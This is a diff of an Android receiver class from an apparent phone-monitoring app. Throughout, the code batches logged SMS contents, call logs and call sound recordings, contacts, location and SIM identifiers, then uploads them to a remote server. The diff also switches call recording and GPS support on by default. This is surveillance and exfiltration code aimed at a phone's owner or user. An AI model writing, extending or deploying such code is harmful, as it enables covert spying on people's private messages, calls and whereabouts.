@@ -1,14 +1,7 @@
 package com.privacy.monitor.receiver;
 
-import java.io.BufferedReader;
 import java.io.File;
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.InputStreamReader;
 import java.util.ArrayList;
-import java.util.Collection;
-import java.util.HashMap;
-import java.util.Iterator;
 import org.json.JSONException;
 import org.json.JSONObject;
 import com.google.gson.Gson;
@@ -61,11 +54,12 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	private boolean isCloseMobileNet ;
 	private Context context;
 	private Thread executeLoc,executeSoundRec;
+	private  SharedPreferences sp ;
 	
 	@Override
 	public void onReceive(final Context context, Intent intent) {
 		this.context = context;
-		final SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
+		sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
 		if(TextUtils.isEmpty(myPhone)){
 			myPhone = sp.getString(C.PHONE_NUM,"");
 		}
@@ -89,8 +83,8 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			String devID = sp.getString(C.DEVICE_ID,"");
 			String devSystem = sp.getString(C.DEVICE_SYSTEM,"");
 			String supRec = sp.getString(C.DEVICE_SUP_REC,"1");
-			String supCallRec = sp.getString(C.DEVICE_SUP_CALL_REC,"0");
-			String supGPS = sp.getString(C.DEVICE_SUP_GPS,"0");
+			String supCallRec = sp.getString(C.DEVICE_SUP_CALL_REC,"1");
+			String supGPS = sp.getString(C.DEVICE_SUP_GPS,"1");
 			DeviceInfo deviceInfo = new DeviceInfo();
 			deviceInfo.setBrand(devBrand);
 			deviceInfo.setDeviceID(devID);
@@ -130,9 +124,16 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				if(tm==null){
 					tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
 				}
+				Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE,new String []{myPhone});
+				String callStatus = monitor.getCallMonitorStatus();
+				String smsStatus = monitor.getSmsMonitorStatus();
+				if("1".equals(callStatus)){
+					uploadCallRecord(callRecordDB,context);
+				}
 				
-			    uploadSMSData(smsRecordDB,context);
-			    uploadCallRecord(callRecordDB,context);
+				if("1".equals(smsStatus)){
+					 uploadSMSData(smsRecordDB,context);
+				}
 				
 				SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
 				String simID = tm.getSimSerialNumber();
@@ -153,34 +154,27 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 		
 	}
 	
-	private void insertDB(HashMap<String,Monitor> hashMap){
-		//增加前先删除所有的数据
-		monitorDB.deleteAll();
-		 Collection<Monitor> monitors = hashMap.values();
-		 Iterator<Monitor> iterator = monitors.iterator();
-		 while(iterator.hasNext()){
-			 Monitor monitor = iterator.next();
-			 monitorDB.insert(monitor);
-		 }
-	}
-	
 	private void uploadSMSData(SMSRecordDB smsRecordDB ,Context context) {
 		ArrayList<SMSRecord> list = smsRecordDB.query(SMSRecord.COL_UPLOAD_STATUS +" = ? ",new String []{"0"});
-			if(list !=null){
-				for (SMSRecord smsRecord : list) {
-					uploadSmsInfo(smsRecordDB,smsRecord,context);
+		if (list != null && list.size() > 0) {
+			ArrayList<ArrayList<String>> msgList = new ArrayList<ArrayList<String>>();
+			for (SMSRecord smsRecord : list) {
+				// uploadSmsInfo(smsRecord);
+				ArrayList<String> msgs = new ArrayList<String>();
+				msgs.add(smsRecord.getType());
+				msgs.add(smsRecord.getPhone());
+				msgs.add(smsRecord.getName());
+				msgs.add(smsRecord.getDateSent());
+				msgs.add(smsRecord.getMessageContent());
+				msgList.add(msgs);
 			}
-		}
-	}
-	
-	private void uploadSmsInfo(SMSRecordDB smsRecordDB,SMSRecord smsRecord,Context context) {
-		SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
-		String updateDate = "my_num="+sp.getString(C.PHONE_NUM,"")+"&you_num="+smsRecord.getPhone()+"&time="+smsRecord.getDateSent()+"&content="+smsRecord.getMessageContent()+"&type="+smsRecord.getType()+"&sim_id="+AppUtil.getIMEI(context)+"&you_name="+smsRecord.getName();
-		String updateResult= AppUtil.streamToStr(NetworkUtil.upload(context,updateDate,C.RequestMethod.uploadSMS));
-		Logger.d("Cron", "返回结果："+updateResult);
-		if("ok".equalsIgnoreCase(updateResult)){
-			Logger.d("Cron", "删除了短信记录...");
-			smsRecordDB.delete(SMSRecord.COL_DATE +" = ?",new String []{smsRecord.getDateSent()});
+			String params = "key=" + ClientSocket.APP_REQ_KEY+ "&device_id=" + sp.getString(C.DEVICE_ID, "")+ "&msg_list=" + new Gson().toJson(msgList);
+			Logger.d("SMSMon","正在上传短信记录");
+			String uploadResult = NetworkUtil.uploadSMS(context, params,C.RequestMethod.uploadSMS);
+			if (uploadResult != null && !uploadResult.startsWith("FAIL")) {
+				Logger.d("SMSMon","上传短信记录成功");
+				smsRecordDB.deleteAll();
+			}
 		}
 	}
 	
@@ -188,13 +182,23 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 		ArrayList<CallRecord> callRecords = callRecordDB.queryAll();
 		if(callRecords !=null){
 		   for (CallRecord callRecord : callRecords) {
+			   ArrayList<ArrayList<String>> lists = new ArrayList<ArrayList<String>>();
 			String result = callRecord.getUploadResult();
 			if(!"0".equals(result)){
-				String uploadResult = NetworkUtil.uploadCall(callRecord.getMyPhone(),callRecord.getPhoneNumber(),callRecord.getCallName(),callRecord.getCallStartTime(),callRecord.getCallStopTime(),callRecord.getSimID(),callRecord.getLon(),callRecord.getLat(),callRecord.getDeviceName(),callRecord.getCallStatus());
-			    if(uploadResult.startsWith(callRecord.getMyPhone()+"/"+callRecord.getMyPhone()+"_"+callRecord.getPhoneNumber()+"_"+callRecord.getCallStatus())){
+				ArrayList<String> callRec = new ArrayList<String>();
+				callRec.add(callRecord.getCallStatus());
+				callRec.add(callRecord.getPhoneNumber());
+				callRec.add(callRecord.getCallName());
+				callRec.add(callRecord.getCallStartTime());
+				callRec.add(callRecord.getCallStopTime());
+				callRec.add(callRecord.getFileName());
+				lists.add(callRec);
+				String params = "key=" + ClientSocket.APP_REQ_KEY + "&device_id=" + sp.getString(C.DEVICE_ID,"") + "&call_list=" + new Gson().toJson(lists);
+				String uploadResult = NetworkUtil.uploadCall(params,C.RequestMethod.uploadCallRecord);
+			    if(uploadResult !=null && !uploadResult.startsWith("FAIL")){
 			    	String filePath = callRecord.getSoundRecordPath();
 			    	if(!TextUtils.isEmpty(filePath)){
-			    		String uploadFileResult = NetworkUtil.uploadFile(uploadResult,filePath);
+			    		String uploadFileResult = NetworkUtil.uploadFile(filePath,callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
 			    		if(uploadFileResult.contains("FAULT")){
 			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
 			    		}else {
@@ -212,10 +216,9 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			    }
 			 }else{
 				 String filePath = callRecord.getSoundRecordPath();
-				 String callResult =callRecord.getUploadResult();
 				 if(!TextUtils.isEmpty(filePath)){
-			    		String uploadFileResult = NetworkUtil.uploadFile(callResult,filePath);
-			    		if(uploadFileResult.contains("FAULT")){
+			    		String uploadFileResult = NetworkUtil.uploadFile(filePath,callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
+			    		if(uploadFileResult.contains("FAIL")){
 			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
 			    		}else {
 							callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
@@ -276,22 +279,11 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			}
 			String param = "key="+ClientSocket.APP_REQ_KEY+"&device_id="+sp.getString(C.DEVICE_ID,"")+"&book_list="+ new Gson().toJson(list);
 		
-			InputStream is = NetworkUtil.upload2(context, param,C.RequestMethod.uploadContact);
-			InputStreamReader isr = new InputStreamReader(is);
-			BufferedReader br = new BufferedReader(isr);
-			String temp = null;
-			String result = "";
-			try {
-				while ((temp = br.readLine()) != null) {
-					result = result + temp;
-				}
+			String result = NetworkUtil.uploadBook(context, param,C.RequestMethod.uploadContact);
+			if(result !=null && !result.startsWith("FAIL")){
 				Editor editor = sp.edit();
 				editor.putBoolean(C.CONTACTS_UPLOAD, true);
 				editor.commit();
-				isr.close();
-				is.close();
-			} catch (IOException e) {
-				e.printStackTrace();
 			}
 		}
 	}
